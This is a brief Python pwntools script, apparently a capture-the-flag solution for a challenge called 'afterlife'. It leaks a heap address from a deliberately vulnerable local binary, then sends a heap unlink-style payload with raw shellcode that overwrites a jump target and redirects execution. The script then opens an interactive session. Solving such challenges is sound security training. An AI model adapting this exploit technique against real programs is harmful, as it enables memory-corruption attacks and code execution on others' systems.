from pwn import *

path = "/problems/afterlife_0_e6b92a146adf0d12b3a84517cdda985f"
#sock = process(["./vuln", "AAAA"])
sock = process(["{}/vuln".format(path), "AAAA"], cwd=path)

sock.recvline()
addr_heap = int(sock.recvline())
sock.recvline()
payload = p32(0x0804d02c - 0xc) + p32(addr_heap + 0x8)
payload += '\xB8\x66\x89\x04\x08\xFF\xE0'
sock.sendline(payload)

sock.interactive()
